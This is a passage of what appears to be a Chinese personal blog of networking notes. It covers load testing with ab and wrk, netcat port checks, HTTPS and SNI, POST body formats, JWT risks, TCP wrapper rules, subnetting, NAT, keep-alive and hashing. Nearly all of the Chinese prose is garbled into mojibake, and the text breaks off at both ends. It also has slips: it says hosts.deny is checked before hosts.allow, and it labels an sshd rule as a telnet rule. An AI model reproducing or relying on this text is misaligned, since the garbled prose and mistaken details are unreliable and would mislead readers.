¸cpuçš„ä¼˜åŠ¿å¯¹serveræ–½åŠ å……åˆ†çš„è´Ÿè½½ã€‚ä¸€èˆ¬è¿™ä¹ˆç”¨ ab -n 1000 -c 100 http://example.com/ab -n &lt;num_requests&gt; -c : å±äºnettyçš„wrk wrk -H â€˜Host: localhostâ€™ -H â€˜Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8â€™ -H â€˜Connection: keep-aliveâ€™ -d 600 -c 1024 -t 8 http://127.0.0.1:8080/plaintext wrk -H â€˜Host: localhostâ€™ -H â€˜Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8â€™ -H â€˜Connection: keep-aliveâ€™ -d 600 -c 1024 -t 8 http://127.0.0.1:8080/plaintext wrkæ˜¯ä¸€ç§http è·‘åˆ†å·¥å…·ï¼Œtcpå’Œudpæµ‹é€Ÿéœ€è¦iperf how-to-use-traceroute-and-mtr-to-diagnose-network-issues .well-knownçš„æ„æ€ï¼Œå…¶å®å°±è·Ÿrobot.txtå·®ä¸å¤šã€‚ä¸€ç§ä¸ºäº†èƒ½å¤Ÿåœ¨å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚(ä½†æ­¤æ—¶å¹¶ä¸æ¸…æ¥šurlç©ºé—´çš„å…è®¸ç­–ç•¥ï¼Œè´¸ç„¶è®¿é—®ä¸‡ä¸€ä¾µæƒäº†å‘¢)è·å¾—ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ã€‚äºæ˜¯RFCå°±æå‡ºæ¥æä¸€ä¸ªä¸“é—¨çš„.well-knownçš„pathï¼Œè¿™ä¸‹é¢çš„ä½ç½®éƒ½æ˜¯å¹¿è€Œå‘¨çŸ¥çš„ï¼Œå¤§å®¶éƒ½çŸ¥é“æ˜¯ç‰¹å®šçš„ç”¨é€”çš„ã€‚ ncå…¶å®å°±æ˜¯netcatäº†ï¼ŒåŠŸèƒ½æ¯”è¾ƒå¼ºå¤§nc -vz 192.168.0.181 20060 //æµ‹è¯•TCPç«¯å£å¯ç”¨æ€§çš„æ–¹æ³•nc -vuz IP port //æµ‹è¯•udpç«¯å£å¯ç”¨æ€§çš„æ–¹å¼ï¼Œä½†å®é™…æµ‹ä¸‹æ¥ï¼Œå°±ç®—serverä¸Šudp portæ²¡å¼€ï¼Œè¿˜æ˜¯ä¼šè¿”å›succeededï¼Œæ‰€ä»¥è¿™ä¸ªä¹Ÿä¸å¯é  netcatè¿˜å¯ä»¥å®ç°udpèŠå¤©æœåŠ¡å™¨ä¸Šnc -ul 1080 // ä¼šå¡åœ¨è¿™é‡Œï¼Œç­‰å¾…æ–°çš„æ¶ˆæ¯åˆ°è¾¾1080ç«¯å£//å®¢æˆ·ç«¯è¿™è¾¹nc -u x.x.x.x 1080 //ä¹Ÿä¼šå¡åœ¨è¿™é‡Œï¼Œä¸è¿‡å¯ä»¥è¾“å…¥æ–‡å­—ï¼ŒæŒ‰ä¸‹å›è½¦ï¼ŒæœåŠ¡å™¨è¿™è¾¹å°±èƒ½æ”¶åˆ°æ¶ˆæ¯äº† wget â€“spider www.baidu.com //wgetè¿˜æœ‰ä¸€ä¸ªspideræ¨¡å¼ â€œping -l 1472 -f www.baidu.com&quot;udpçš„MTUå‚æ•° å‰ç«¯å®‰å…¨ç³»åˆ—ä¹‹äºŒï¼šå¦‚ä½•é˜²æ­¢CSRFæ”»å‡»ï¼Ÿ httpsçš„urlæ˜¯åŠ å¯†çš„å—ï¼Ÿæ˜¯çš„ï¼Œæ‰€ä»¥ä½ å¯ä»¥æŠŠè´¦æˆ·å¯†ç å†™åœ¨urlåé¢å‘å‡ºå»ï¼Œè¿™æ ·æ˜¯å®‰å…¨çš„ï¼Œå¤–ç•Œæ— æ³•æˆªè·ä½ çš„éšç§ä¿¡æ¯.ä½†ç€å®ä¸åº”è¯¥è¿™æ ·åšï¼Œåœ¨æµè§ˆå™¨åœ°å€æ å’Œæµè§ˆå™¨å†å²è®°å½•é‡Œé¢éƒ½ç•™ä¸‹äº†è´¦æˆ·å¯†ç ã€‚å¯èƒ½ä¼šåœ¨httpçš„refereré‡Œé¢å¸¦ä¸Šä½ çš„urlå’Œéšç§ä¿¡æ¯ä½†æ˜¯ç¬¬ä¸€æ¬¡client helloçš„æ—¶å€™hostè¿˜æ˜¯ä¼šæ˜æ–‡å†™åœ¨åŒ…é‡Œ,åé¢çš„query Parametersç”±äºè·Ÿclient helloæ— å…³ï¼Œæ‰€ä»¥æ˜¯åŠ å¯†çš„.Server Name IndicationSNI breaks the â€˜hostâ€™ part of SSL encryption of URLs. You can test this yourself with wireshark. There is a selector for SNI // http postè¯·æ±‚ï¼Œè®¾ç½®content-type = Application/jsonï¼Œbodyé‡Œé¢æ”¾ä¸€ä¸ªintæˆ–è€…longï¼Œå®é™…ä¼ è¾“çš„æ˜¯stringè¿˜æ˜¯long?(çŒœæµ‹æ˜¯stringï¼Œå› ä¸ºè¦èµ°utf-8ä¹‹ç±»çš„encodingè¿‡ä¸€éï¼Œå› ä¸ºhttpæ˜¯text-basedåè®®)è¿™äº‹æ˜¯æœ‰åŒºåˆ«çš„ï¼Œæ¯”å¦‚è¦postå‡ºå»ä¸€ä¸ªâ€6â€ï¼Œå­—ç¬¦ä¸²6çš„asciiç æ˜¯äºŒè¿›åˆ¶ï¼š0011 0110åè¿›åˆ¶ï¼š54åå…­è¿›åˆ¶ï¼š36åªéœ€è¦ä¸€ä¸ªå­—èŠ‚ int ç±»å‹æ•°å­—6 åœ¨javaé‡Œæ˜¯4ä¸ªå­—èŠ‚ï¼Œåœ¨cè¯­è¨€é‡Œæ˜¯2ä¸ªæˆ–è€…å››ä¸ªå­—èŠ‚ã€‚é‚£ä¹ˆè¿™ä¸ªæ•°å­—å†å¤§ä¸€ç‚¹å‘¢å­—ç¬¦ä¸²66666666éœ€è¦å…«ä¸ªå­—èŠ‚ int ç±»å‹æ•°å­—66666666 åœ¨javaé‡Œæ˜¯4ä¸ªå­—èŠ‚ï¼Œåœ¨cè¯­è¨€é‡Œæ˜¯2ä¸ªæˆ–è€…å››ä¸ªå­—èŠ‚ã€‚éœ€è¦å››ä¸ªå­—èŠ‚ æ•´ä½“æ¥è®²ï¼ŒJSON æ˜¯æ–‡æœ¬çš„æ ¼å¼ï¼Œæ•´æ•°å’Œæµ®ç‚¹æ•°åº”è¯¥æ›´å ç©ºé—´è€Œä¸”æ›´è´¹æ—¶ã€‚è¿™å°±æ¶‰åŠåˆ°jsonå’Œprotobuffç­‰äºŒçº§åˆ¶åè®®çš„æ¯”å¯¹äº†ï¼Œä»ä¸Šé¢æ¥çœ‹ï¼Œå¦‚æœä½ çš„å†…å®¹æ˜¯æ•´æ•°æˆ–è€…æµ®ç‚¹æ•°æ¯”è¾ƒå¤šçš„è¯ï¼Œä¸€å¤§é•¿ä¸²çš„æ•°å­—ç”¨stringçš„è¯å°±å¾—èŠ±ä¸Šå¾ˆå¤šå†…å­˜ï¼Œä½†æ˜¯ç”¨intæˆ–è€…floatçš„è¯å¯èƒ½å››ä¸ªå­—èŠ‚å°±æå®šäº†ã€‚æ‰€ä»¥è¿™äº‹æ²¡æ³•ç»å¯¹çš„è¯´ éƒ½çŸ¥é“ä¼ è¾“çš„éƒ½æ˜¯byteæ•°ç»„ï¼ŒçŒœæµ‹ä¼ çš„ç±»å‹æ˜¯æ–‡å­—å½¢å¼çš„ã€‚å› ä¸ºè¯»å–çš„æ—¶å€™å¤šæ•°æ˜¯utf-8å½¢å¼çš„ï¼Œæ²¡åŠæ³•ç‰¹æ„æŒ‡å‡ºè¿™å—byteæ˜¯intè¿˜æ˜¯stringçš„ä¸€éƒ¨åˆ† postä¸€ä¸ªjsonå‡ºå»çš„æ—¶å€™ {&quot;name&quot;:&quot;john&quot;} //äº‹å®ä¸Šåœ¨byteå±‚é¢æ˜¯å‘é€äº†è¿™ä¹ˆäº›byte 123 { 34 &quot; 110 n 97 a 109 m 101 e 34 &quot; 58 : 34 &quot; 106 j 111 0 104 h 110 n 34 &quot; 125 } è¿™äº›æ ‡ç‚¹ç¬¦å·éƒ½å‘é€å‡ºå»äº†ï¼Œä¹Ÿå°±æ˜¯å ç”¨çš„byte. å››ç§å¸¸è§çš„POSTæäº¤æ•°æ®æ–¹å¼ application/x-www-form-urlencodedmultipart/form-dataapplication/jsontext/xml application/jsonçš„postè¯·æ±‚çš„é•¿è¿™æ · POST / HTTP/1.1 Host: www.baidu.com User-Agent: ... Content-Length:27 Cookie: session=fsdaf;aaa=dfasf;...... {&quot;input1&quot;:&quot;xxx&quot;,&quot;input2&quot;:&quot;ooåŠ å¯†è¿‡çš„xxxxo&quot;,&quot;remember&quot;:false} application/x-www-form-urlencoded(æµè§ˆå™¨çš„åŸç”Ÿ form è¡¨å•)çš„postè¯·æ±‚çš„é•¿è¿™æ · POST / HTTP/1.1 Host: www.baidu.com User-Agent: ... Content-Length:27 Cookie: session=fsdaf;aaa=dfasf;...... name=user&amp;password=password multipart/form-data:(è¡¨å•æ ¼å¼çš„)è¿™ä¸€ç§æ˜¯è¡¨å•æ ¼å¼çš„ï¼Œæ•°æ®ç±»å‹å¦‚ä¸‹ POST / HTTP/1.1 Host: www.baidu.com User-Agent: ... Content-Length:27 Cookie: session=fsdaf;aaa=dfasf;...... ------WebKitFormBoundaryrGKCBY7qhFd3TrwA Content-Disposition: form-data; name=&quot;text&quot; title ------WebKitFormBoundaryrGKCBY7qhFd3TrwA Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot; Content-Type: image/png PNG ... content of chrome.png ... ------WebKitFormBoundaryrGKCBY7qhFd3TrwA-- text/xml:è¿™ç§ç›´æ¥ä¼ çš„xmlçš„postè¯·æ±‚çš„é•¿è¿™æ · POST / HTTP/1.1 Host: www.baidu.com User-Agent: ... Content-Length:27 Cookie: session=fsdaf;aaa=dfasf;...... &lt;!--?xml version=&quot;1.0&quot;?--&gt; &lt;methodcall&gt; &lt;methodname&gt;examples.getStateName&lt;/methodname&gt; &lt;params&gt; &lt;param&gt; &lt;value&gt;&lt;i4&gt;41&lt;/i4&gt;&lt;/value&gt; &lt;/params&gt; &lt;/methodcall&gt; data%3D%7B%22name%22%3A%22john%22%2C%22age%22%2C20%2C%22time%22%2C6%7D è¿™ç§ä¸œè¥¿é€šå¸¸æ˜¯æ‡’å¾—çœ‹çš„ï¼Œéœ€è¦è½¬ç ä¸€ä¸‹ï¼Œç²˜è´´åˆ°è¿™ä¸ªé‡Œé¢å»å°±è¡Œäº†ï¼Œæˆ–è€…è‡ªå·±encodeURIComponentä¸€ä¸‹å°±å¥½å…¶å®æ˜¯: data={â€œnameâ€:â€johnâ€,â€ageâ€,20,â€timeâ€,6} å‡ºå¤„ HTTP ä¸ºè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼Œæ•´ä¸ªçš„ HTTP æŠ¥æ–‡ï¼Œå¦‚æœæŒ‰ç¼–ç¨‹è¯­è¨€é‡Œé¢çš„ç±»å‹æ¥åˆ†çš„è¯ï¼Œå°±æ˜¯ä¸€å¤§æ®µå­—ç¬¦ä¸²ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸åƒ JSONï¼Œapplication/x-www-form-urlencoded çš„æ–¹å¼å¯¹å¤æ‚ç±»å‹ï¼ˆä¾‹å¦‚æ•°ç»„ï¼‰çš„å¤„ç†ï¼Œå¹¶æ²¡æœ‰ä¸¥æ ¼çš„æ ‡å‡†ã€‚æœ‰çš„æ¥å£ä½¿ç”¨ key[]=a&amp;key[]=b æ¥è¡¨ç¤ºæ•°ç»„ key: [â€˜aâ€™, â€˜bâ€™]ï¼Œï¼ˆè¿™ä¹Ÿæ˜¯æœ€å¸¸è§çš„ï¼ŒjQueryã€superagentç­‰å®¢æˆ·ç«¯ä¼šå¦‚æ­¤ç¼–ç ï¼‰ï¼Œæœ‰çš„åº“åˆ™å°†æ•°ç»„ç¼–ç ä¸ºï¼škey=a&amp;key=bï¼Œæœ‰çš„åˆ™æ˜¯æºå¸¦ä¸‹æ ‡è¿›è¡Œç¼–ç ï¼škey[0]=a&amp;key[1]=bâ€¦â€¦ååˆ†æ··ä¹±ã€‚æ‰€ä»¥å¦‚æœæ˜¯æ•°ç»„ä¸”æ•°ç»„çš„æ¯ä¸€é¡¹ä¸ºç®€å•åŸºæœ¬ç±»å‹ï¼Œè€Œä¸”éè¦ç”¨ application/x-www-form-urlencoded è¿›è¡Œåºåˆ—åŒ–ï¼Œé‚£ä¹ˆä¸å¦‚ç”¨è‹±æ–‡é€—å·åˆ†éš”çš„å­—ç¬¦ä¸²æ¥è¡¨ç¤ºã€‚å¦‚æœæ˜¯åµŒå¥—å¯¹è±¡â€¦â€¦é‚£ä¹ˆè¿˜æ˜¯å°½æ—©ä½¿ç”¨ JSON å§ã€‚ jwtäº‹å®ä¸Šå°±æ˜¯æœåŠ¡å™¨é¢å‘ç»™å®¢æˆ·ç«¯ä¸€ä¸ªåŠ å¯†åï¼ˆåªæœ‰serveræ‰èƒ½è§£å¯†ï¼‰çš„å­—ç¬¦ä¸²ï¼Œå®¢æˆ·ç«¯æ¯æ¬¡è¯·æ±‚çš„æ—¶å€™å°±åœ¨headeré‡Œé¢å¸¦ä¸Šè¿™ä¸ªå­—ç¬¦ä¸²ã€‚sessionless-authentication-withe-jwts If an attacker somehow manages to steal a userâ€™s JWT, then thereâ€™s unfortunately not much that can really be done. To minimize damages, you should design your application to require reauthentication before performing any high profile transaction such as a purchase or the changing of a password. And your JWTs should also have an expiration date. That way a compromised JWT will only work for so long. ä½†æ˜¯å¦‚æœæœ‰äººæŠŠè¿™ä¸ªheaderæåˆ°ï¼Œå°±èƒ½å‘æœåŠ¡å™¨å£°ç§°è‡ªå·±æ˜¯è¯¥ç”¨æˆ·ã€‚æœåŠ¡å™¨æ˜¯åªè®¤è¿™ä¸ªjwtå­—ç¬¦ä¸²ä¸è®¤äººçš„ï¼Œç¢°åˆ°è¿™ç§æƒ…å†µå…¶å®ä¹Ÿæ²¡ä»€ä¹ˆè§£å†³åŠæ³•ï¼Œæœ€å¤šæŠŠjwtçš„æœ‰æ•ˆæœŸè®¾ç½®çš„çŸ­ä¸€ç‚¹ã€‚ å­ç½‘æ©ç è¡¨ç¤ºä¸€ä¸ªç½‘æ®µçš„æ–¹å¼ä¼˜å…ˆçº§ä¸ºå…ˆæ£€æŸ¥hosts.denyï¼Œå†æ£€æŸ¥hosts.allowï¼Œåè€…è®¾å®šå¯è¶Šè¿‡å‰è€…é™åˆ¶ï¼Œä¾‹å¦‚ï¼ša.é™åˆ¶æ‰€æœ‰çš„sshï¼Œé™¤éä»218.64.87.0 - 127ä¸Šæ¥ã€‚hosts.deny:in.sshd:ALLhosts.allow:in.sshd:218.64.87.0/255.255.255.128 b.å°æ‰218.64.87.0 - 127çš„telnethosts.denyin.sshd:218.64.87.0/255.255.255.128 c.é™åˆ¶æ‰€æœ‰äººçš„TCPè¿æ¥ï¼Œé™¤éä»218.64.87.0 - 127è®¿é—®hosts.denyALL:ALLhosts.allowALL:218.64.87.0/255.255.255.128 d.é™åˆ¶218.64.87.0 - 127å¯¹æ‰€æœ‰æœåŠ¡çš„è®¿é—®hosts.denyALL:218.64.87.0/255.255.255.128 å…¶ä¸­å†’å·å‰é¢æ˜¯TCP daemonçš„æœåŠ¡è¿›ç¨‹åç§°ï¼Œé€šå¸¸ç³»ç»Ÿè¿›ç¨‹åœ¨/etc/inetd.confä¸­æŒ‡å®šï¼Œæ¯”å¦‚in.ftpdï¼Œin.telnetdï¼Œin.sshd å…¶ä¸­IPåœ°å€èŒƒå›´çš„å†™æ³•æœ‰è‹¥å¹²ä¸­ï¼Œä¸»è¦çš„ä¸‰ç§æ˜¯ï¼š 1.ç½‘ç»œåœ°å€â€“å­ç½‘æ©ç æ–¹å¼ï¼š 218.64.87.0/255.255.255.0 2.ç½‘ç»œåœ°å€æ–¹å¼ï¼ˆæˆ‘è‡ªå·±è¿™æ ·å«ï¼Œå‘µå‘µï¼‰ 218.64.ï¼ˆå³ä»¥218.64æ‰“å¤´çš„IPåœ°å€ï¼‰ 3.ç¼©ç•¥å­ç½‘æ©ç æ–¹å¼ï¼Œå³æ•°ä¸€æ•°äºŒè¿›åˆ¶å­ç½‘æ©ç å‰é¢æœ‰å¤šå°‘ä¸ªâ€œ1â€æ¯”å¦‚ï¼š 218.64.87.0/255.255.255.0 â€“ 218.64.87.0/24 æ¯”æ–¹è¯´ï¼šåœ¨å­ç½‘192.168.20.0/30ä¸­ï¼Œèƒ½æ¥æ”¶åˆ°ç›®çš„åœ°å€ä¸º192.168.20.3çš„IPåˆ†ç»„çš„æœ€å¤§ä¸»æœºæ•°æ˜¯ï¼ˆï¼‰åˆ°è¿™ä¸ªåœ¨çº¿å­ç½‘æ©ç è®¡ç®—å™¨ä¸­è¾“å…¥ï¼Œç»“æœæ˜¯å¯ç”¨ip 2æ©ç  255 255 255 252ç½‘ç»œ 192 168 20 0ç¬¬ä¸€å¯ç”¨ 192 168 20 1ç¬¬äºŒå¯ç”¨ 192 168 20 2å¹¿æ’­ 192 168 20 3 è§£é‡Šä¸‹å°±æ˜¯ 30 è¯´æ˜å‰é¢æœ‰30ä¸ª1ï¼Œåé¢åªå‰©ä¸‹ä¿©ä½ï¼Œä¹Ÿå°±æ˜¯å››ç§å¯èƒ½ï¼Œä½†æœ‰ä¿©æ˜¯è¦ä¿ç•™ç»™ç½‘ç»œå’Œå¹¿æ’­çš„ï¼Œæ‰€ä»¥åªå‰©ä¸‹2ä¸ª NAPTåŸç†ç®€å•æ¥è¯´ï¼Œåœ¨NATç½‘å…³ä¸Šä¼šæœ‰ä¸€å¼ æ˜ å°„è¡¨ï¼Œè¡¨ä¸Šè®°å½•äº†å†…ç½‘å‘å…¬ç½‘å“ªä¸ªIPå’Œç«¯å£å‘èµ·äº†è¯·æ±‚ï¼Œç„¶åå¦‚æœå†…ç½‘æœ‰ä¸»æœºå‘å…¬ç½‘è®¾å¤‡å‘èµ·äº†è¯·æ±‚ï¼Œå†…ç½‘ä¸»æœºçš„è¯·æ±‚æ•°æ®åŒ…ä¼ è¾“åˆ°äº†NATç½‘å…³ä¸Šï¼Œé‚£ä¹ˆNATç½‘å…³ä¼šä¿®æ”¹è¯¥æ•°æ®åŒ…çš„æºIPåœ°å€å’Œæºç«¯å£ä¸ºNATç½‘å…³è‡ªèº«çš„IPåœ°å€å’Œä»»æ„ä¸€ä¸ªä¸å†²çªçš„è‡ªèº«æœªä½¿ç”¨çš„ç«¯å£ï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªä¿®æ”¹è®°å½•åˆ°é‚£å¼ æ˜ å°„è¡¨ä¸Šã€‚æœ€åæŠŠä¿®æ”¹ä¹‹åçš„æ•°æ®åŒ…å‘é€åˆ°è¯·æ±‚çš„ç›®æ ‡ä¸»æœºï¼Œç­‰ç›®æ ‡ä¸»æœºå‘å›äº†å“åº”åŒ…ä¹‹åï¼Œå†æ ¹æ®å“åº”åŒ…é‡Œé¢çš„ç›®çš„IPåœ°å€å’Œç›®çš„ç«¯å£å»æ˜ å°„è¡¨é‡Œé¢æ‰¾åˆ°è¯¥è½¬å‘ç»™å“ªä¸ªå†…ç½‘ä¸»æœºã€‚è¿™æ ·å°±å®ç°äº†å†…ç½‘ä¸»æœºåœ¨æ²¡æœ‰å…¬ç½‘IPçš„æƒ…å†µä¸‹ï¼Œé€šè¿‡NAPTæŠ€æœ¯å€ŸåŠ©è·¯ç”±å™¨å”¯ä¸€çš„ä¸€ä¸ªå…¬ç½‘IPæ¥è®¿é—®å…¬ç½‘è®¾å¤‡ã€‚åœ¨è¾ƒæ—©ä»¥å‰çš„ RFC 1918 æ–‡æ¡£ä¸­å¯¹ç§æœ‰åœ°å€æœ‰ç›¸å…³çš„è¯´æ˜ã€‚ å› ç‰¹ç½‘åŸŸååˆ†é…ç»„ç»‡IANAç»„ç»‡ï¼ˆInternet Assigned Numbers Authorityï¼‰ä¿ç•™äº†ä»¥ä¸‹ä¸‰ä¸ªIPåœ°å€å—ç”¨äºç§æœ‰ç½‘ç»œã€‚ 10.0.0.0 - 10.255.255.255 (10/8æ¯”ç‰¹å‰ç¼€) 172.16.0.0 - 172.31.255.255 (172.16/12æ¯”ç‰¹å‰ç¼€) 192.168.0.0 - 192.168.255.255 (192.168/16æ¯”ç‰¹å‰ç¼€) æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ä¸­æœ‰1ä¸ªAç±»åœ°å€å—ï¼Œ32ä¸ªBç±»åœ°å€å—å’Œ256ä¸ªCç±»åœ°å€å—ã€‚ä¸»æµçš„å®¶ç”¨è·¯ç”±å™¨ä½¿ç”¨Cç±»ç§æœ‰åœ°å€ä½œä¸ºè·¯ç”±å™¨LANç«¯çš„IPåœ°å€è¾ƒå¤šï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è·¯ç”±å™¨è®¾ç½®é¡µé¢çš„IPä¸€èˆ¬éƒ½ä¸º192.168å¼€å¤´ã€‚ tcp keep-aliveå’Œhttpçš„keep-aliveæ˜¯ä¸¤å›äº‹ http keep-aliveæ˜¯ç”±webserverè´Ÿè´£å®ç°çš„ã€‚ å…³é”®å­—:http keepalive implementation http1.0ä¸­æ¯ä¸ªtcpè¿æ¥ç”¨å®Œäº†å°±å…³é—­æ‰ http1.1ä¸­æ¯ä¸ªè¿æ¥ç”¨å®Œäº†ä¸å…³é—­,(ä¿ç•™ä¸€ä¸ªkeepAliveæ—¶é—´ï¼Œåœ¨OkHttpé‡Œé¢é»˜è®¤ä¸€æ¡è¿æ¥åœ¨æ²¡æœ‰ä½¿ç”¨è¿‡çš„æƒ…å†µä¸‹ä¿ç•™5åˆ†é’Ÿæ‰å…³é—­) è¿™ç¯‡å›ç­”é‡Œè§£é‡Šäº†http keep-aliveæ˜¯ä¸ºäº†è®©åç»­çš„httpè¯·æ±‚å¤ç”¨è¿™ä¸€æ¡tcpè¿æ¥ã€‚è€Œtcpçš„keep aliveåˆ™æ˜¯å®šæœŸå‘å°çš„åŒ…ã€‚ å¦å¤–,http serverå¹¶ä¸ä¼šä¸»åŠ¨å»é—®clientæ˜¯å¦è¿˜è¿ç€ï¼Œåªéœ€è¦èµ·ä¸€ä¸ªtimeout(åˆ°æ—¶é—´å°±ææ‰è¿™æ¡tcp)å°±è¡Œäº†ã€‚ä¸‹æ¬¡å®¢æˆ·ç«¯å†æ¥å‘èµ·è¯·æ±‚ï¼Œé‡æ–°èµ·ä¸€æ¡tcpå§ã€‚ä½†æ˜¯http keepaliveåœ¨æœ‰äº›æ—¶å€™ä¹Ÿæ˜¯æœ‰é—®é¢˜çš„(http-keepAliveçš„ç¼ºç‚¹ï¼Œå¤šä¸ªè¯·æ±‚åŒæ—¶åˆ°è¾¾å°±ä¼šå› ä¸ºå¤´éƒ¨é˜»å¡è€Œå»¶è¿Ÿï¼Œè¿™ç§æ—¶å€™è¿˜ä¸å¦‚é‡æ–°æä¸€ä¸ªsocketå¤„ç†)è™½è¯´HTTP/1.1 Keep-Aliveç‰¹æ€§æ”¯æŒå¤šä¸ªè¯·æ±‚åœ¨åŒä¸€ä¸ªè¿æ¥ä¸Šæ’é˜Ÿå‘é€ï¼Œåœ¨æµè§ˆå™¨ç«¯æ­£å¸¸çš„HTMLç­‰èµ„æºè¯·æ±‚ï¼Œä¼šå¸¦æ¥çº¿å¤´é˜»å¡å¼Šç«¯ï¼Œåä¸€ä¸ªè¯·æ±‚ä¾èµ–äºå‰ä¸€ä¸ªè¯·æ±‚å®Œæˆï¼Œä¸€æ—¦å‡ºç°é˜»å¡ï¼Œåç»­è¯·æ±‚åªèƒ½æ’é˜Ÿç­‰å¾…ã€‚ ç§»åŠ¨APPåç«¯ç½‘ç»œå¤„ç†ä¸€äº›é—®é¢˜è®°å½•HTTP/1.1 Pipeliningï¼ˆå»ºç«‹åœ¨Keep-AliveæŒä¹…åŒ–åŸºç¡€ä¹‹ä¸Šï¼Œä¸­æ–‡è¯‘ä¸ºç®¡çº¿åŒ–ï¼Œæ”¯æŒè¿ç»­çš„å¹‚ç­‰çš„GET/HEADæ–¹æ³•è¯·æ±‚ï¼Œå®é™…ç¯å¢ƒä¸‹ï¼Œå¹¶æ²¡æœ‰è¢«æµè§ˆå™¨æ‰€æ”¯æŒã€‚åŒä¸€ä¸ªè¿æ¥ï¼Œå¤„ç†åŒæ ·çš„ä¸‰æ¬¡è¯·æ±‚-å“åº”ï¼‰ arp caches hashç®—æ³•å’ŒåŠ å¯†å“ˆå¸Œç®—æ³•æ˜¯ä¸å¯é€†çš„ï¼Œè€ŒåŠ å¯†ç®—æ³•æ˜¯å¯é€†çš„å“ˆå¸Œï¼ˆHashï¼‰æ˜¯å°†ç›®æ ‡æ–‡æœ¬è½¬æ¢æˆå…·æœ‰ç›¸åŒé•¿åº¦çš„ã€ä¸å¯é€†çš„æ‚å‡‘å­—ç¬¦ä¸²ï¼ˆæˆ–å«åšæ¶ˆæ¯æ‘˜è¦ï¼‰ï¼Œè€ŒåŠ å¯†ï¼ˆEncryptï¼‰æ˜¯å°†ç›®æ ‡æ–‡æœ¬è½¬æ¢æˆå…·æœ‰ä¸åŒé•¿åº¦çš„ã€å¯é€†çš„å¯†æ–‡ã€‚ å…·ä½“æ¥è¯´ï¼Œä¸¤è€…æœ‰å¦‚ä¸‹é‡è¦åŒºåˆ«ï¼š 1ã€å“ˆå¸Œç®—æ³•å¾€å¾€è¢«è®¾è®¡æˆç”Ÿæˆå…·æœ‰ç›¸åŒé•¿åº¦çš„æ–‡æœ¬ï¼Œè€ŒåŠ å¯†ç®—æ³•ç”Ÿæˆçš„æ–‡æœ¬é•¿åº¦ä¸æ˜æ–‡æœ¬èº«çš„é•¿åº¦æœ‰å…³ã€‚ ä¾‹å¦‚ï¼Œè®¾æˆ‘ä»¬æœ‰ä¸¤æ®µæ–‡æœ¬ï¼šâ€œMicrosoftâ€å’Œâ€œGoogleâ€ã€‚ä¸¤è€…ä½¿ç”¨æŸç§å“ˆå¸Œç®—æ³•å¾—åˆ°çš„ç»“æœåˆ†åˆ«ä¸ºï¼šâ€œ140864078AECA1C7C35B4BEB33C53C34â€å’Œâ€œ8B36E9207C24C76E6719268E49201D94â€ï¼Œè€Œä½¿ç”¨æŸç§åŠ å¯†ç®—æ³•çš„åˆ°çš„ç»“æœåˆ†åˆ«ä¸ºâ€œNjdsptpguâ€å’Œâ€œHpphmfâ€ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå“ˆå¸Œçš„ç»“æœå…·æœ‰ç›¸åŒçš„é•¿åº¦ï¼Œè€ŒåŠ å¯†çš„ç»“æœåˆ™é•¿åº¦ä¸åŒã€‚å®é™…ä¸Šï¼Œå¦‚æœä½¿ç”¨ç›¸åŒçš„å“ˆå¸Œç®—æ³•ï¼Œä¸è®ºä½ çš„è¾“å…¥æœ‰å¤šä¹ˆé•¿ï¼Œå¾—åˆ°çš„ç»“æœé•¿åº¦æ˜¯ä¸€ä¸ªå¸¸æ•°ï¼Œè€ŒåŠ å¯†ç®—æ³•å¾€å¾€ä¸æ˜æ–‡çš„é•¿åº¦æˆæ­£æ¯”ã€‚ 2ã€å“ˆå¸Œç®—æ³•æ˜¯ä¸å¯é€†çš„ï¼Œè€ŒåŠ å¯†ç®—æ³•æ˜¯å¯é€†çš„ã€‚ è¿™é‡Œçš„ä¸å¯é€†æœ‰ä¸¤å±‚å«ä¹‰ï¼Œä¸€æ˜¯â€œç»™å®šä¸€ä¸ªå“ˆå¸Œç»“æœRï¼Œæ²¡æœ‰æ–¹æ³•å°†Eè½¬æ¢æˆåŸç›®æ ‡æ–‡æœ¬Sâ€ï¼ŒäºŒæ˜¯â€œç»™å®šå“ˆå¸Œç»“æœRï¼Œå³ä½¿çŸ¥é“ä¸€æ®µæ–‡æœ¬Sçš„å“ˆå¸Œç»“æœä¸ºRï¼Œä¹Ÿä¸èƒ½æ–­è¨€å½“åˆçš„ç›®æ ‡æ–‡æœ¬å°±æ˜¯Sâ€ã€‚å…¶å®ç¨å¾®æƒ³æƒ³å°±çŸ¥é“ï¼Œå“ˆå¸Œæ˜¯ä¸å¯èƒ½å¯é€†çš„ï¼Œå› ä¸ºå¦‚æœå¯é€†ï¼Œé‚£ä¹ˆå“ˆå¸Œå°±æ˜¯ä¸–ç•Œä¸Šæœ€å¼ºæ‚çš„å‹ç¼©æ–¹å¼äº†â€”â€”èƒ½å°†ä»»æ„å¤§å°çš„æ–‡ä»¶å‹ç¼©æˆå›ºå®šå¤§å°ã€‚(è¿™è¯çš„æ„æ€å°±æ˜¯ä¸åŒçš„å†…å®¹å¯èƒ½ä¼šæœ‰ç›¸åŒçš„hashCodeï¼Œæ‰€ä»¥åœ¨httpsåŠ å¯†ä¸­) åŠ å¯†åˆ™ä¸åŒï¼Œç»™å®šåŠ å¯†åçš„å¯†æ–‡Rï¼Œå­˜åœ¨ä¸€ç§æ–¹æ³•å¯ä»¥å°†Rç¡®å®šçš„è½¬æ¢ä¸ºåŠ å¯†å‰çš„æ˜æ–‡Sã€‚ httpsæµç¨‹1.æµè§ˆå™¨å°†è‡ªå·±æ”¯æŒçš„ä¸€å¥—åŠ å¯†è§„åˆ™å‘é€ç»™ç½‘ç«™ã€‚2.ç½‘ç«™ä»ä¸­é€‰å‡ºä¸€ç»„åŠ å¯†ç®—æ³•ä¸HASHç®—æ³•ï¼Œå¹¶å°†è‡ªå·±çš„èº«ä»½ä¿¡æ¯ä»¥è¯ä¹¦çš„å½¢å¼å‘å›ç»™æµè§ˆå™¨ã€‚è¯ä¹¦é‡Œé¢åŒ…å«äº†ç½‘ç«™åœ°å€ï¼ŒåŠ 